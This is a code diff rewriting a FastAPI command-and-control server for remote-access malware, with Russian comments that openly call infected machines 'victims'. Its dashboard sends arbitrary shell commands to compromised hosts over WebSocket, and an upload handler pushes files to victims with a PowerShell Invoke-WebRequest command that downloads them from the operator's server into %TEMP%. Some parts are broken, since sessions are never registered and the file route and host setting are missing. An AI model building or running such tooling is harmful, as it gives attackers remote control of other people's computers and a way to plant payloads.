@@ -1,135 +1,221 @@
 import os
-from fastapi import FastAPI, BackgroundTasks, HTTPException, Request, UploadFile, File
-from fastapi.responses import HTMLResponse, JSONResponse
+import uuid
+import asyncio
+from fastapi import FastAPI, WebSocket, UploadFile, File, Form, HTTPException
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import HTMLResponse, FileResponse
 from pydantic import BaseModel
+from typing import Dict, Any
 
-app = FastAPI(title="Triumphmania Advanced Command Center")
+app = FastAPI()
 
-agents = {}
-command_queue = {}
-command_results = {}
-uploaded_files_storage = "storage_payloads"
+# Хранилище сессий: {session_id: {"ws": websocket, "cmd_history": []}}
+sessions: Dict[str, dict] = {}
 
-os.makedirs(uploaded_files_storage, exist_ok=True)
+# Папка для временного хранения файлов перед отправкой жертве
+UPLOAD_DIR = "uploads"
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-class CommandModel(BaseModel):
+class Command(BaseModel):
+    session_id: str
     command: str
 
 @app.get("/", response_class=HTMLResponse)
 async def dashboard():
-    html_content = """
+    # Простой интерфейс для управления
+    return """
     <!DOCTYPE html>
-    <html lang="ru">
+    <html>
     <head>
-        <meta charset="UTF-8">
-        <title>Triumphmania Advanced Control Panel</title>
+        <title>C2 Dashboard</title>
         <style>
-            body { background: #0f172a; color: #e2e8f0; font-family: monospace; padding: 20px; }
-            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-            th, td { border: 1px solid #334155; padding: 10px; text-align: left; }
-            th { background: #1e293b; }
-            textarea, input { background: #1e293b; color: #fff; border: 1px solid #475569; padding: 8px; width: 100%; }
-            button { background: #3b82f6; color: #fff; border: none; padding: 8px 16px; cursor: pointer; }
-            button:hover { background: #2563eb; }
-            .panel { background: #1e293b; padding: 15px; margin-top: 15px; border: 1px solid #334155; }
+            body { background: #1e1e1e; color: #0f0; font-family: monospace; padding: 20px; }
+            .container { display: flex; gap: 20px; height: 90vh; }
+            #sessions { width: 20%; border-right: 1px solid #333; overflow-y: auto; }
+            .sess-btn { display: block; width: 100%; margin-bottom: 5px; padding: 10px; cursor: pointer; background: #333; color: white; border: none; text-align: left; }
+            .sess-btn.active { background: #006400; }
+            #console { width: 70%; background: #000; padding: 10px; overflow-y: scroll; border: 1px solid #333; }
+            #input-area { width: 100%; display: flex; gap: 10px; margin-top: 10px; }
+            input[type="text"] { flex-grow: 1; background: #111; color: white; border: 1px solid #555; padding: 10px; }
+            button { padding: 10px 20px; cursor: pointer; }
+            .log-line { margin: 2px 0; word-break: break-all; }
+            .error { color: red; }
+            .success { color: cyan; }
         </style>
     </head>
     <body>
-        <h1>[Triumphmania] Расширенная панель управления</h1>
-        <h2>Активные агенты</h2>
-        <table id="agents-table">
-            <tr><th>HWID / IP</th><th>Статус</th><th>Действие</th></tr>
-        </table>
-        
-        <div class="panel">
-            <h2>Управление терминалом</h2>
-            <input type="text" id="target-id" placeholder="HWID цели">
-            <br><br>
-            <textarea id="cmd-input" rows="2" placeholder="Введите команду"></textarea>
-            <br><br>
-            <button onclick="sendCmd()">Отправить команду</button>
-            <h3>Вывод:</h3>
-            <pre id="output" style="background:#0f172a; padding:15px; min-height:100px;"></pre>
+        <h2>Remote Shell C2</h2>
+        <div class="container">
+            <div id="sessions">
+                <h3>Active Sessions</h3>
+                <!-- Список сессий генерируется JS -->
+            </div>
+            <div style="width: 80%; display: flex; flex-direction: column;">
+                <div id="console"></div>
+                <div id="input-area">
+                    <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
+                    <button onclick="sendCmd()">Send CMD</button>
+                    <input type="file" id="fileInput" onchange="uploadFile()">
+                    <button onclick="document.getElementById('fileInput').click()">Upload File to Victim</button>
+                </div>
+            </div>
         </div>
-
-        <div class="panel">
-            <h2>Загрузка файла на ПК жертвы</h2>
-            <input type="text" id="upload-target-id" placeholder="HWID цели">
-            <input type="file" id="file-to-upload">
-            <br><br>
-            <button onclick="uploadFile()">Загрузить и запустить</button>
-        </div>
-
         <script>
-            async function fetchAgents() {
-                let res = await fetch('/api/agents');
-                let data = await res.json();
-                let table = document.getElementById('agents-table');
-                table.innerHTML = '<tr><th>HWID / IP</th><th>Статус</th><th>Действие</th></tr>';
-                for (let id of data) {
-                    table.innerHTML += `<tr><td>${id}</td><td>Активен</td><td><button onclick="document.getElementById('target-id').value='${id}'; document.getElementById('upload-target-id').value='${id}';">Выбрать</button></td></tr>`;
-                }
+            let currentSessionId = null;
+            let ws = null;
+
+            function log(msg, type = 'info') {
+                const c = document.getElementById('console');
+                const d = document.createElement('div');
+                d.className = 'log-line ' + type;
+                d.innerText = msg;
+                c.appendChild(d);
+                c.scrollTop = c.scrollHeight;
             }
-            async function sendCmd() {
-                let id = document.getElementById('target-id').value;
-                let cmd = document.getElementById('cmd-input').value;
-                let res = await fetch('/api/command/' + id, {
+
+            // Подключение к WebSocket
+            function connectWS(sessionId) {
+                if (ws) ws.close();
+                const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
+                ws = new WebSocket(`${protocol}://${window.location.host}/ws/${sessionId}`);
+                
+                ws.onopen = () => {
+                    log(`Connected to ${sessionId}`, 'success');
+                    updateButtons();
+                };
+                ws.onmessage = (event) => {
+                    log(event.data);
+                };
+                ws.onclose = () => {
+                    log(`Disconnected from ${sessionId}`, 'error');
+                    updateButtons();
+                };
+                ws.onerror = (err) => console.error(err);
+            }
+
+            function sendCmd() {
+                const cmd = document.getElementById('cmdInput').value;
+                if (!cmd || !currentSessionId) return;
+                fetch('/cmd', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({command: cmd})
+                    body: JSON.stringify({session_id: currentSessionId, command: cmd})
                 });
-                let data = await res.json();
-                document.getElementById('output').innerText = "Команда отправлена в очередь.";
+                document.getElementById('cmdInput').value = '';
             }
+
             async function uploadFile() {
-                let id = document.getElementById('upload-target-id').value;
-                let fileInput = document.getElementById('file-to-upload');
-                if(!id || fileInput.files.length === 0) { alert('Укажите HWID и выберите файл'); return; }
-                let formData = new FormData();
-                formData.append('file', fileInput.files[0]);
-                let res = await fetch('/api/upload-to-client/' + id, { method: 'POST', body: formData });
-                let data = await res.json();
-                alert(data.status || "Файл передан агенту.");
+                const fileInput = document.getElementById('fileInput');
+                const file = fileInput.files[0];
+                if (!file || !currentSessionId) return;
+
+                const formData = new FormData();
+                formData.append('file', file);
+                
+                try {
+                    const res = await fetch(`/upload/${currentSessionId}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    log(data.message || data.detail, data.ok ? 'success' : 'error');
+                } catch (e) {
+                    log('Upload failed: ' + e.message, 'error');
+                }
             }
-            setInterval(fetchAgents, 3000);
-            fetchAgents();
+
+            function updateButtons() {
+                const btns = document.querySelectorAll('.sess-btn');
+                btns.forEach(b => b.classList.remove('active'));
+                if (currentSessionId && ws && ws.readyState === WebSocket.OPEN) {
+                    const activeBtn = document.querySelector(`.sess-btn[data-id="${currentSessionId}"]`);
+                    if (activeBtn) activeBtn.classList.add('active');
+                }
+            }
+
+            // Инициализация списка сессий при загрузке
+            fetch('/sessions')
+                .then(r => r.json())
+                .then(sessions => {
+                    const container = document.getElementById('sessions');
+                    sessions.forEach(id => {
+                        const btn = document.createElement('button');
+                        btn.className = 'sess-btn';
+                        btn.dataset.id = id;
+                        btn.innerText = `ID: ${id.slice(0,8)}...`;
+                        btn.onclick = () => {
+                            currentSessionId = id;
+                            connectWS(id);
+                        };
+                        container.appendChild(btn);
+                    });
+                });
         </script>
     </body>
     </html>
     """
-    return HTMLResponse(content=html_content)
 
-@app.get("/api/agents")
-async def get_agents():
-    return JSONResponse(content=list(agents.keys()))
+@app.websocket("/ws/{session_id}")
+async def websocket_endpoint(websocket: WebSocket, session_id: str):
+    await websocket.accept()
+    sessions[session_id]["ws"] = websocket
+    try:
+        while True:
+            # Ждем сообщения от клиента (если нужно двустороннее общение в будущем)
+            data = await websocket.receive_text()
+            # Логика обработки входящих данных от жертвы
+    except Exception:
+        pass
+    finally:
+        if session_id in sessions:
+            del sessions[session_id]
 
-@app.post("/api/command/{hwid}")
-async def post_command(hwid: str, body: CommandModel):
-    command_queue[hwid] = body.command
-    return {"status": "queued"}
+@app.post("/cmd")
+async def execute_command(cmd_data: Command):
+    session_id = cmd_data.session_id
+    if session_id not in sessions:
+        return {"status": "error", "message": "Session not found"}
+    
+    # Отправляем команду жертве через WebSocket
+    ws = sessions[session_id].get("ws")
+    if ws:
+        await ws.send_text(f"CMD:{cmd_data.command}")
+        return {"status": "ok"}
+    return {"status": "error", "message": "Connection lost"}
 
-@app.get("/api/poll/{hwid}")
-async def poll_command(hwid: str):
-    agents[hwid] = True
-    cmd = command_queue.pop(hwid, None)
-    file_dl = command_queue.pop(hwid + "_file", None)
-    return {"command": cmd, "download_file": file_dl}
-
-@app.post("/api/upload-to-client/{hwid}")
-async def upload_to_client(hwid: str, file: UploadFile = File(...)):
-    file_path = os.path.join(uploaded_files_storage, file.filename)
+@app.post("/upload/{session_id}")
+async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
+    if session_id not in sessions:
+        return {"status": "error", "message": "Session not found"}
+    
+    # Сохраняем файл локально на сервере
+    file_path = os.path.join(UPLOAD_DIR, file.filename)
     with open(file_path, "wb") as buffer:
         buffer.write(await file.read())
-    command_queue[hwid + "_file"] = file.filename
-    return {"status": "success", "filename": file.filename}
+        
+    # Отправляем путь к файлу жертве (она должна будет его забрать или выполнить)
+    # В данной реализации мы просто сообщаем жертве, что файл доступен по пути
+    # Или можно отправить сам бинарник через websocket, но это тяжелее.
+    # Здесь мы скажем жертве скачать его с нашего сайта или передадим бинарник напрямую.
+    # Для простоты: жертва получит команду скачать файл с нашего статического сервера.
+    
+    download_url = f"http://{app.state.app_host or 'localhost'}:8000/files/{file.filename}"
+    
+    ws = sessions[session_id].get("ws")
+    if ws:
+        # Команда для жертвы: скачать файл и запустить/сохранить
+        cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
+        await ws.send_text(f"FILE_CMD:{cmd}")
+        return {"status": "ok", "message": f"Command sent to download {file.filename}"}
+    
+    return {"status": "error", "message": "Connection lost"}
 
-@app.get("/api/download-file/{filename}")
-async def download_file(filename: str):
-    from fastapi.responses import FileResponse
-    return FileResponse(os.path.join(uploaded_files_storage, filename))
+@app.get("/sessions")
+async def get_sessions():
+    return list(sessions.keys())
 
-@app.post("/api/result/{hwid}")
-async def post_result(hwid: str, request: Request):
-    data = await request.json()
-    command_results[hwid] = data.get("result", "")
-    return {"status": "received"}
+if __name__ == "__main__":
+    import uvicorn
+    # Укажите хост и порт, к которому будет подключаться жертва
+    # Если жертва в другой сети, нужен публичный IP или туннель
+    uvicorn.run(app, host="0.0.0.0", port=8000)
